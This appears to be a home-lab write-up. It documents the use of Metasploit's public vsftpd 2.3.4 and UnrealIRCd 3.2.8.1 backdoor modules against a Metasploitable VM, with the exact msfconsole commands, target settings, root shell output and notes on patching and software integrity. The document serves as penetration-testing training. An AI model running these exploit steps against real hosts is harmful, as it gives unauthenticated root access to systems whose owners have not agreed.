# Home Lab - Week 2

## Objective
Exploit the vsftpd 2.3.4 backdoor vulnerability found during Week 1 reconnaissance.

## Vulnerability
vsftpd 2.3.4 contains a known backdoor: a maliciously modified version of the source
code that opens a root shell on port 6200 when a username containing ":)" is used
during FTP login.

## Steps Taken
1. Launched Metasploit: `msfconsole`

<img width="1920" height="936" alt="msfconsole" src="https://github.com/user-attachments/assets/2768c8d4-7c8e-4d97-9e5c-e655f36683bf" />

2. Searched for the exploit: `search vsftpd`

<img width="1920" height="384" alt="search vsftpd" src="https://github.com/user-attachments/assets/eb8ecea3-05d2-4083-aff1-4701bad26cba" />

3. Selected module: `use exploit/unix/ftp/vsftpd_234_backdoor`   
4. Set target: `set RHOSTS 192.168.100.150`

<img width="1920" height="936" alt="rhosts" src="https://github.com/user-attachments/assets/0b9d21b0-929f-4735-9cec-5c53519246f8" />

5. Set local host: `set LHOST [my Kali IP]`

<img width="1920" height="936" alt="lhost" src="https://github.com/user-attachments/assets/c2c94538-7056-4a26-864b-7d9e13423f47" />

6. Ran the exploit: `run`

## Result
Successfully obtained a root shell on the target machine without authentication.

<img width="1920" height="936" alt="run" src="https://github.com/user-attachments/assets/b6c0216c-d21a-44a7-bfcd-9af1b152d98c" />


Confirmed access with:
- `whoami` → root
- `uname -a` → Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

<img width="1920" height="936" alt="Output" src="https://github.com/user-attachments/assets/e7dfbb7a-947e-4687-a5c7-db60c07c8759" />


## What I Learned
This demonstrates how outdated, unpatched software can contain critical backdoors.
A single unauthenticated command gave full root access to the system — showing why
version detection during recon (Week 1) directly informs real attack paths.


## Exploit 2: UnrealIRCd 3.2.8.1 Backdoor (Port 6667)

## Vulnerability
UnrealIRCd 3.2.8.1 contained a malicious backdoor inserted into the source code
distribution. It allowed an attacker to execute arbitrary commands on the server
without authentication, triggered through a specially crafted string sent to the
IRC service.

## Steps Taken
1. Searched for the exploit: `search unrealircd`

<img width="1920" height="936" alt="search UnrealIRCd" src="https://github.com/user-attachments/assets/384106be-f7b6-42e6-854d-17ffed45b48b" />
   
3. Selected module: `use exploit/unix/irc/unreal_ircd_3281_backdoor`
4. Set target: `set RHOSTS 192.168.100.150`

<img width="1920" height="936" alt="Rhosts for Unreal" src="https://github.com/user-attachments/assets/73772401-6104-4ce5-98e1-ed3a1ccb34a1" />

6. Set local host: `set LHOST 192.168.151`

<img width="1920" height="936" alt="lhost for Unreal (2)" src="https://github.com/user-attachments/assets/4aaa1d16-ade2-4860-b556-c41ecd9dbfdb" />

8. Verified settings: `show options`

<img width="1920" height="936" alt="option Unreal" src="https://github.com/user-attachments/assets/a23e6a6f-ffbf-40c4-8572-1b92ce6d1605" />

9. Ran the exploit: `run`

<img width="1920" height="936" alt="run Unreal" src="https://github.com/user-attachments/assets/91bfd151-0ac2-4f95-bbac-9577e22ef05e" />


## Result
Successfully exploited the backdoor and obtained a shell/session on the target
machine without authentication.

Confirmed access with:

<img width="1920" height="936" alt="Output Unreal" src="https://github.com/user-attachments/assets/b38e4f8f-c3fe-4df3-9f9b-5fc9217d0d52" />


## What I Learned
This is another example of a widely-used service shipping with a compromised,
backdoored version. Unlike the vsftpd exploit (a modified authentication flow),
this backdoor works by injecting a command execution trigger directly into the
IRC protocol handling. It reinforces why verifying software integrity (checksums,
official sources) matters — this backdoor originated from a compromised download
server, not the vulnerability itself being intentional.

## Comparison with Exploit 1 (vsftpd)
| | vsftpd 2.3.4 | UnrealIRCd 3.2.8.1 |
|---|---|---|
| Trigger | Malicious login string (":)" in username) | Crafted string sent to IRC service |
| Access gained | Root shell | Shell/command execution |
| Root cause | Backdoored source code | Backdoored source code (compromised download) |
